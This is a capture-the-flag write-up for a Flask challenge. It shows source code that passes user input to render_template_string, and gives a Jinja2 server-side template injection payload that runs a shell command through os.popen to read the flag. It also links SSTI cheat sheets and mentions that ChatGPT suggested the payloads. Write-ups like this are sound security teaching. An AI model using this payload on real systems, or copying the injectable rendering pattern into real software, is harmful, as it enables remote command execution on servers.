Link: https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/

Source Code:
```python
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)

if __name__ == '__main__':
    app.run(debug=True, port=80)
```
The code above present's a simple application that mimic's a chat with a stochastic parrot that simply echo's the response on both sides.

### Solution
The vulnerability in the code above lies in the line: 
```
result = render_template_string(user_input)
```

To achieve the solution, I simply asked ChatGPT to provide different possible payload's to exploit the flask SSTI.

##### Payload
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

![[Pasted image 20240705110807.png]]
###### Resources
- [Flask SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
- [Flask SSTI Cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [Unveiling the Secrets of Server-Side Template Injection](https://medium.com/@baraiprince0111/unveiling-the-secrets-of-server-side-template-injection-ssti-in-flask-and-jinja2-25c57ab3199f)
- [Exploring SSTI in Flask/Jinja2](https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/)